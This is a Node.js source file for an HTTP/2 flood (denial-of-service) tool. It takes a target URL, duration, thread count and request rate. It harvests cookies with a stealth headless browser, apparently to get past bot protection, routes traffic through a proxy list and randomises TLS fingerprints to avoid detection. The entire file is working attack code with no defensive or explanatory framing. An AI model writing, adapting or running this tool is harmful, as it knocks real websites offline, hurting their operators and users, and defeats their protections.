const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const userAgents = require('user-agents'); // For generating random user agents
const cluster = require('cluster');
const net = require('net');
const http2 = require('http2');
const url = require('url');
const crypto = require('crypto');
const tls = require('tls');
const fs = require('fs');

puppeteer.use(StealthPlugin());
 
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
       return 1;
    })
    .on("SIGCHILD", () => {
       return 1;
    });

const TARGET = process.argv[2];
const DURATION = process.argv[3]
const THREADS = process.argv[4];
const RATE = process.argv[5];


const proxies = fs.readFileSync('proxy.txt', "utf-8").toString().split(/\r?\n/);

const PARSED = url.parse(TARGET);

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
async function Get_Cookies() {
    const browser = await puppeteer.launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    const userAgent = new userAgents();
    const uaString = userAgent.toString();

    await page.setUserAgent(uaString);
    await page.setViewport({ width: 1920, height: 1080 });

    console.clear();
    console.log(`[INFO] Browser Opening Host Page ${TARGET}`);
    const response = await page.goto(TARGET, { waitUntil: 'domcontentloaded' });

    const status = response.status();
    console.log(`[INFO] Status Code: ${status}`);

    // Show page title
    const pageTitle = await page.title();
    console.log(`[INFO] Title Page: ${pageTitle}`);

    await new Promise(resolve => setTimeout(resolve, 2000));

    const cookies = await page.cookies();
    const actualUserAgent = await page.evaluate(() => navigator.userAgent);

    await browser.close();
    return {
        cookies: cookies.map(c => `${c.name}=${c.value}`).join('; '),
        status: cookies,
        userAgent: actualUserAgent
    };
}
function shuffle(array) {
    return array.sort(() => Math.random() - 0.5);
}
function JA3Fingerprints() {
    const components = {
        sslVersions: ['771', '770', '769'],
        cipherSuites: [
            '4865', '4866', '4867', 
            '49195', '49199', 
            '49171', '49172'
        ],
        extensions: [
            '0', '11', '10', 
            '35', '16', '23', 
            '65281', '43'
        ],
        ellipticCurves: [
            '29', '23', '24', 
            '256', '257'
        ],
        ellipticCurveFormats: ['0', '1']
    };

    const randomSelect = (arr, min, max) => 
        shuffle(arr).slice(0, min + Math.floor(Math.random() * (max - min + 1)));

    return {
        ja3: {
            version: components.sslVersions[0],
            ciphers: randomSelect(components.cipherSuites, 3, 5).join('-'),
            extensions: randomSelect(components.extensions, 4, 7).join('-'),
            curves: randomSelect(components.ellipticCurves, 2, 4).join('-'),
            formats: randomSelect(components.ellipticCurveFormats, 1, 2).join('-')
        },
        fingerprint: crypto.randomBytes(16).toString('hex')
    };
}
function GenerateTLS(parsed, socket) {
    const tlsVersions = ['TLSv1.3', 'TLSv1.2'];
    const selectedVersion = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];

    const cipherSuites = [
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_AES_128_GCM_SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-AES128-GCM-SHA256'
    ].join(':');

    const ellipticCurves = [
        'X25519', 
        'P-256', 
        'P-384', 
        'secp521r1'
    ].join(':');

    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha256'
    ].join(':');

    const secureOptions = 
        crypto.constants.SSL_OP_NO_SSLv2 | 
        crypto.constants.SSL_OP_NO_SSLv3 | 
        crypto.constants.SSL_OP_NO_TLSv1 | 
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_NO_COMPRESSION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

    const ja3Fingerprint = JA3Fingerprints();

    return tls.connect({
        host: parsed.host,
        servername: parsed.host,
        ciphers: cipherSuites,
        sigalgs: signatureAlgorithms,
        curves: ellipticCurves,
        minVersion: selectedVersion,
        maxVersion: 'TLSv1.3',
        ALPNProtocols: ['h2'],
        socket: socket,
        secure: true,
        requestCert: true,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        sessionTimeout: 0,
        honorCipherOrder: true,
        extensions: {
            ...ja3Fingerprint,
            clientHelloVersion: selectedVersion
        }
    });
}
const PROXIES_REQUEST = new NetSocket();
const headers = {
    ':authority': PARSED.host,
    ':method': 'GET',
    ':path': PARSED.path,
    ':scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'user-agent': `${process.env.SHARED_UA}`,
    'cookie': `${process.env.SHARED_COOKIES}`
};
function Flooder() {
    try {
        // 1. Select random proxy
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        const PROXY_Connect = {
            host: proxy[0],
            port: parseInt(proxy[1]),
            address: PARSED.host + ":443",
            timeout: 10
        };

        // 3. Proxy connection
        PROXIES_REQUEST.HTTP(PROXY_Connect, (connection, error) => {
            if (error) return;

            // 4. TLS setup
            const Tls_Socket = GenerateTLS(PARSED, connection);
            Tls_Socket.on('error', () => {
                Tls_Socket.destroy();
            })
            Tls_Socket.setKeepAlive(true, 60000);
            Tls_Socket.setNoDelay(true);

            // 5. HTTP/2 client
            const client = http2.connect(PARSED.href, {
                createConnection: () => Tls_Socket,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 33554432,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 100,
                    maxHeaderListSize: 262144
                }
            });
            client.on("connect", () => {
                setInterval(() => {
                    for (let i = 0; i < RATE; i++) {
                        const request = client.request(headers)
                        
                        request.on("response", response => {
                            request.close();
                            request.destroy();
                            request.on('data', (data) => { delete data })
                        });
        
                        request.end();
                    }
                }, 500); 
            });

            // 7. Cleanup handlers
            client.on('close', () => {
                client.destroy();
                connection.destroy();
            });

            client.on('error', (err) => {
                if (['ERR_HTTP2_GOAWAY_SESSION', 'ECONNRESET'].includes(err.code)) {
                    client.destroy();
                    connection.destroy();
                }
            });
        });
    } catch (error) {
    }
}

async function Starter() {
    if (cluster.isMaster) {
        const result = await Get_Cookies();
        console.log('[INFO] Cookies:', result.cookies)
        console.log("[INFO] Flood starting....")

        process.env.SHARED_COOKIES = result.cookies;
        process.env.SHARED_UA = result.userAgent;

        for (let i = 0; i < THREADS; i++) {
            cluster.fork();
        }
    } else {
        setInterval(Flooder);
    }
}Starter();

setTimeout(() => {
    process.exit(-1);
}, DURATION * 1000);